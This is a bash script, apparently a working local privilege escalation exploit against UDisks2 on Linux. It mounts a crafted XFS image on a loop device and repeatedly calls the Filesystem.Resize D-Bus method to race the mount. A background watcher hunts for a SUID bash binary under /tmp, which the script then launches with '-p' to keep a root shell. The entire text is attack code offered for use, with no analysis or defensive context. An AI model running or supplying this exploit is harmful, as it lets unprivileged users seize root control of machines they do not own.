#!/bin/bash
# Final working version - maintains root shell

echo "[+] Starting exploit..."

killall -9 gvfs-udisks2-volume-monitor 2>/dev/null

# Setup loop
LOOP_DEV=$(udisksctl loop-setup --file ./xfs.image --no-user-interaction 2>&1 | grep -o '/dev/loop[0-9]*')
LOOP_NAME=${LOOP_DEV##*/}
echo "[+] Loop: $LOOP_DEV"

# Create marker file
rm -f /tmp/rootshell_path 2>/dev/null

# Watcher that saves the bash path when found
(
    while true; do
        for bash_path in /tmp/blockdev.*/bash; do
            if [ -f "$bash_path" ] 2>/dev/null; then
                echo "$bash_path" > /tmp/rootshell_path
                # Keep this running so mount stays active
                while [ -f "$bash_path" ]; do
                    sleep 1
                done
            fi
        done
        sleep 0.01
    done
) &
WATCHER=$!

sleep 1

# Trigger resize
echo "[*] Triggering resize..."
for i in {1..10}; do
    gdbus call --system --dest org.freedesktop.UDisks2 \
        --object-path "/org/freedesktop/UDisks2/block_devices/$LOOP_NAME" \
        --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' >/dev/null 2>&1 &
    sleep 0.1
done

# Wait for bash to be found
echo "[*] Waiting for SUID bash..."
for i in {1..20}; do
    if [ -f /tmp/rootshell_path ]; then
        ROOTBASH=$(cat /tmp/rootshell_path)
        echo "[+] Found root bash at: $ROOTBASH"
        ls -l "$ROOTBASH" 2>/dev/null
        echo "[+] Launching root shell..."
        echo ""
        $ROOTBASH -p
        break
    fi
    sleep 0.5
done

if [ ! -f /tmp/rootshell_path ]; then
    echo "[-] Failed to find root bash"
    kill $WATCHER 2>/dev/null
fi

rm -f /tmp/rootshell_path
